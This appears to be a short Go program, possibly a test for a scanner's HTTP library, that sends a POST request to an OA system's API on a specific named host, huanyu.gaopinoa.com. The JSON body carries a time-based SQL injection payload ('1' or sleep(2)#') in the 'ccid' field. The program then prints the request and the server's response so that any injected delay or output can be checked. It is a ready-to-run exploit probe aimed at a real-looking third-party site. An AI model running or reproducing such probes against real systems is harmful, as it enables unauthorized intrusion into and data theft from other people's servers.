package main

import (
	"fmt"
	"io"
	"net/http"
	"strings"

	"github.com/zan8in/retryablehttp"
)

func main() {
	opts := retryablehttp.DefaultOptionsSpraying

	client := retryablehttp.NewClient(opts)

	target := "http://huanyu.gaopinoa.com/index.php?a=api&m=openkqj|openapi&d=task&sn=1&/post"
	body := `{"a":{"data":"fingerprint","ccid":"1' or sleep(2)#'","fingerprint":"3"}}`

	req, err := retryablehttp.NewRequest(http.MethodPost, target, strings.NewReader(body))
	if err != nil {
		panic(err)
	}

	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0")
	req.Header.Add("Accept-Encoding", "gzip")

	resp, err := client.RawTCPDo(req.Request)
	// resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

	fmt.Println("打印请求头：")

	//打印 /path 和 host
	fmt.Printf("%s %s %s\n", req.Method, req.URL.RequestURI(), req.Proto)
	fmt.Printf("Host: %s\n", req.URL.Host)

	// 遍历打印请求头
	for key, values := range req.Header {
		for _, value := range values {
			fmt.Printf("%s: %s\n", key, value)
		}
	}

	fmt.Println("")

	// 打印 body
	fmt.Printf("Body: %s\n", body)

	fmt.Println("-------------------")

	// 遍历打印响应头
	fmt.Println("打印响应头：")
	fmt.Printf("%s %s\n", resp.Proto, resp.Status)

	for key, values := range resp.Header {
		for _, value := range values {
			fmt.Printf("%s: %s\n", key, value)
		}
	}

	fmt.Println("")

	data, err := io.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	fmt.Println(string(data))

}
